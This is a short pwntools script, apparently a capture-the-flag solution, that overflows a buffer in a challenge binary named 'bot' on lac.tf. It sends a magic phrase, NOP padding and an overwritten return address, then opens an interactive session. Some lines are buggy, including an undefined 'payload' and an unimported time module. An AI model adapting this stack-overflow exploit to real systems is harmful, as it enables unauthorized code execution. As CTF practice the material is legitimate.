#!/usr/bin/env python3
# Author : trustie_rity
#import time
from pwn import *
context.update(arch="amd64",os="linux")
context.terminal = ['alacritty', '-e', 'zsh', '-c']

elf = ELF("./bot")
if args["remote"]:
	p = remote("0.0.0.0", "1337")
elif args["SSH"]:
	r = ssh("username","0.0.0.0",port=1337,password="guest")
	p = r.process(executable="./bot",argv=["bot",payload]) 
else:
	p = elf.process()

#gdb.attach(p)
p = remote("lac.tf" , 31180)
offset = 34
input_ = b"please please please give me the flag"
log.info(f"{ p.recv().decode() }")
addr = (0x401295)
payload = input_ + b"\x00" + b"\x90"* offset + p64(addr)

p.sendline(payload)
print(p.recv())

time.sleep(15)
p.interactive()
